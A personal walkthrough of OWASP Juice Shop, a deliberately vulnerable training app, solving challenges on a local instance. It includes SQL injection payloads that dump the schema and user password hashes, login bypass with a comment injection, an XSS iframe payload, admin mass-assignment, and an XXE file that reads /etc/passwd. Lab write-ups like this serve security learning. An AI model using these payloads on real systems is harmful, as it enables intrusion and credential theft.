This is my writeup for OWASP Juice-Shop.
I did not include the writeups for challenges that were quick and easy to solve: mostly challenges with Stars 0,1,2.

======= Stars 1 =======

admin@juice-shop
admin123

# normal account
abc@hacks.com
abcde1


Challenge: Retrieve the photo of Bjoern's cat in "melee combat mode".
1. Go to `PhotoWall` and we see an alt. text of failed-to-load img
2. Inspect element and right click on the img link
	a. Link:http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-#zatschi-#whoneedsfourlegs-1572600969477.jpg
3. # is not properly url-encoded, and this causes the img. to fail to load
4. replace # with %23 to properly load the img.



Challenge: Meta Geo Stalking
1. Download John's Image to retrieve the meta data
2. Coordinates are 36.958717N 84.348217W
3. Google search results gives Daniel Boone National Forest

new creds
john@juice-sh.op
123123123


======== Stars 2 ========

Challenge: Visual Geo Stalking
1. In Photo Wall Section, download Emma's Image
2. Zoom in to the left, we see ITsec.
3. Go to Forget Password, we guess emma's email as emma@juice-sh.op
4. Guess password as ITsec

new creds
emma@juice-sh.op
123123123

======= Stars 3 =======

Challenge: API-only XSS
1. Using Burp Suite, look at HTTP History after visting web pages.
2. Looking at js files with Debugger, we know there are /api/Products endpoints.
3. In Burp Suite, send one /api/quantity to repeater and change dest. to /api/Products/6 where 6 is the Pdt. ID 
4. Change the method to PUT to update the resource. 
5. Attempt to change the description value, but we need admin Authorisation Token. We can steal that after logging in as admin. (Done in previous challenges)
6. We then change the description to the following:
	{"description": "<iframe src=\"javascript:alert(`xss`)\">" }
7. Take note that we need to escape the quotations. 
8. Finish. 


Challenge: Admin Registration
1. OWASP API 
2. With Burp Suite running in the background, we register a user with normal priveledges.
3. Since we know there are more fields returned in the response than in the request, we can try to assign the fields that we want to change.
4. role:admin
5. Done


Challenge:  Bjoern's Favorite Pet
1. OSINT. https://www.youtube.com/watch?v=Lu0-kDdtVf4
2. bjoern@owasp.org
3. Security Question: Zaya

New Creds
bjoern@owasp.org
password


Challenge: CAPTCHA Bypass
1. Use Burpsuite to check out the pages loaded when loading the Feedback page and when submitting a Feedback. We get pages of the following paths:
	a. /rest/captcha
	b. /rest/use/whoami
	c. /api/Feedbacks
2. The response to /rest/captcha leaks the answer in JSON and notice that captchaId increments with step size of 1 each time a request is sent. So we can craft a bash script that curls this path to get the ID and answer.
3. We craft a POST request and embed the ID and answer fields, also take include a header for Content-Type to be applcation/json4. Iterate this 2 cmds 10 times in a for loop and we solve this Challenge.

Script used: captcha-bypass.sh

Challenge: Database Schema
1. Use Burpsuite to capture the pages when searching for a product at homepage
2. There is an endpoint that potentially interacts with the database
	a. /rest/products/search?q=
3. We can tinker with this:
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%201,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
	b. %20 is required for url to decode as space at server side.
	c. We are using UNION to query both applke and the sqlite_master schema
4. We get back a successful resposne from the database. We now know the TABLE column names.

{"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}

5. GET /rest/products/search?q=applke'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
	a. This allows us to get the schema.



Challenge: Deluxe Fraud
1. Navigate to Deluxe Membership as a regular-permissioned user.
2. Inspect Element on Payment Button "Pay 49.00" and remove "disabled=true" together with the portion of the classname with disabled in it. Proberly has some js script that applies logic to disable the button.
3. Click the button with burpsuite running.
	a. POST Request is made. 
	b. {"paymentMode":"wallet"}
4. We can remove the value "wallet" and replace it with an empty string.
	a. And we get a success message back. 
	b. Apparently the server-side logic failed to check for empty payment modes. 


Challenge: GDPR Data Erasure
1. Just trying to guess Chris's email as chris@juice-sh.op and using SQL Injection for password as 'or 1=1-- fails. This is not surprising.
2. From the previous challenge, we were able to get the schema from SQL db
	a. One interesting table is: `Privacy Requests`
	b. "CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
	b. Creds of chris:
		i. chris.pike@juice-sh.op
		ii. 10a783b9ed19ea1c67c3a27699f0095b

4. We log in with just chris email, adding '-- at the back to comment out the rest of the SQL checks
	a. This allows us to log in with any password
	b. eg: chris.pike@juice-sh.op'--
5. Done

Challenge: Login Amy
1. "One Important Final Note" is described as follows:
The example with “D0g.....................” should not be taken literally because if everyone began padding their passwords with simple dots, attackers would soon start adding dots to their guesses to bypass the need for full searching through unknown padding. Instead, YOU should invent your own personal padding policy. You could put some padding in front, and/or interspersed through the phrase, and/or add some more to the end. You could put some characters at the beginning, padding in the middle, and more characters at the end. And also mix-up the padding characters by using simple memorable character pictures like “<->” or “[*]” or “^-^”  . . . but do invent your own!

If you make the result long and memorable, you'll have super-strong passwords that are also easy to use! 
2. Also, we know amy's email address from the previous SQL injection
	a. amy@juice-sh.op
	b. 030f05e45e30710c3ad3c32f00de0473
3. Although we can bypass the password check by adding '-- to the back of her email, we do not pass this challenge as we ARE NOT logging in with her orginal creds.
	a. We need to find her password. 
	b. crackstation returns nothing on that hash.
4. After googling "One Important Final Note" -> We get led to this site https://www.grc.com/haystack.htm?id
5. From "One Important Final Note", we can swap out "D0g" with "K1f" [Her husband's name] and add periods "." to the end of it in GRC's Interactive Brute Force Password "Search Space" Calculator until it reaches 93.83 billion trillion trillion centuries as hinted in the Challenge Statment.
6. Login to finish the challenge.

Challenge: Login Bender
1. From previous SQL Injection, we know Bender's email address as bender@juice-sh.op with password hash as 0c36e517e3fa95aabf1bbffc6744a4ef.
2. Logging in as bender@juice-sh.op'-- allows us to bypass the password check
3. We can use ANY password to login. 
4. Done.

Challenge: Login Jim
1. Same as Challenge titled "Login Bender"

Challenge: Manipulate Basket
1. First we login as normal user, capture REQ and RESP with Burpsuite. Since I just completed the previous Challenge, I'd use Jim's account instead. You can sign up as a new user as well. 
2. When adding an item to basket, we can see a POST Req to /api/BasketItems/
	a. {"ProductId":24,"BasketId":"2","quantity":1}
3. We can attempt to change the BasketId to add to another User's Basket.
	a. Send to Repeater, change BasketId.
	b. It gives 'Invalid BasketId'. 
	c. Sending the same POST Req. returns a validation error
		i. BasketId must be valid.
	d. We change "ProductId" to 1, and a success message is returned.
		i. We can validate by heading over to our Basket to see the new item being added to our basket.
4. We refer to https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
	a. Testing for HTTP Parameter Pollution.
	b. We send more than 1 instance of BasketId fields and see how the server handles that. 
	c. Sending 
{
	"ProductId":10,
	"BasketId":"2",
	"BasketId":"3",
	"quantity":1
}
	d. Returns "success" message and Challenge is completed.


Challenge: PayBack Time
1. This is a classic attack.
2. When adding to basket, we see a POST REQ made to /api/BasketItems/ with payload of {"ProductId":6,"BasketId":"2","quantity":1}
3. We change the quantity to -100 to attempt to checkout.
	a. The request is successful and we can confirm this with the negative qty of the item in our UI.
4. Now we will use the UI to checkout. Challenge completed. 
5. The whole idea is to pay negative dollars to get a total postive value in our digital wallet. 

Challenge: Privacy Policy Inspection
Hint: Only by visiting a special URL you can confirm that you read it carefully. If you find some particularly hot sections in the policy you might want to melt them together.
1. We navigate to Juice Shops's  Privacy Policy page.
2. Inspect Element when we see the first "hot" section.
	a. The html element has a class name associated to "hot"
	b. Using Console in DevTools, we can get all HTML elements of that class name using document.getElementsByClassName('hot')
	c. It returns a HTML Collection of 6 elements --> we have 6 hot sections.
	d. Concatentating all of them in a URL, we get http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
3. Challenge Completed. Interesting.

Challenge: Product Tampering
1. In Burpsuite, we make a request to /api/Products to get all Products listed in the website.
	a. We can see that Product Name of "OWASP SSL Advanced Forensic Tool (O-Saft)" is assigned to and id:9
	b. make a GET request to /api/Products/9
	c. making a PUT request to /api/Products/9 with {"description":"<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"} 
		i. Sending this PUT request does not change the description.
		ii. Adding a header --> Content-Type: application/json
		iii. Description is changed.
4. Challenge Completed.


Challenge: Reset Jim's Password
1. Jim's security question: Your eldest sibling's middle name?
2. Clicking on the Hints, we know Jim is a celebrity.
3. Searching Jim star trek and his eldest sibling is George Samuel Kirk.
	a. Ans to security question is Samuel

Challenge: Upload Size
1. Log in as any user and navigate to Complaints Tab at http://localhost:3000/#/complain
2. We are unable to attach a document of size > 100KB. 
	a. Proberbly some client side filtering is going on. 
3. We see in Burpsuite POST to /file-upload is made
4. Trying to manually send a file rockyou.pdf [size=134M] failed.
	a. This might mean that there are server-side filtering for upper file size limit.
5. Sending a a random pdf of size=113K works using curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/a.pdf' http://localhost:3000/file-upload
6. Challenge Completed.

Challenge: Upload Type
1. Navigate to /complain and we get an ERROR:Forbidden file type. Only PDF, ZIP allowed. when we try to upload files of types otherwise specified.
2. There might be Client-side filtering, lets manually send the file using curl to the endpoint /file-upload
	a. curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/a.jpg' http://localhost:3000/file-upload
	b. WORKS. 
3. Challenge Completed.

Challenge: XXE Data Access
Hint: The leverage point for this challenge is the deprecated B2B interface. --> From previous chalenge, we know the deprecated B2B interface is the complain
1. Since we know we can upload .xml files; lets try XXE Injections.
2. I'd send a file: b.xml that has <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root> written in it.3. Using curl -F 'file=@/home/kali/Desktop/juice-shop_12.3.0/notes/b.xml' http://localhost:3000/file-upload
	a. It succesfully retreives /etc/passwd
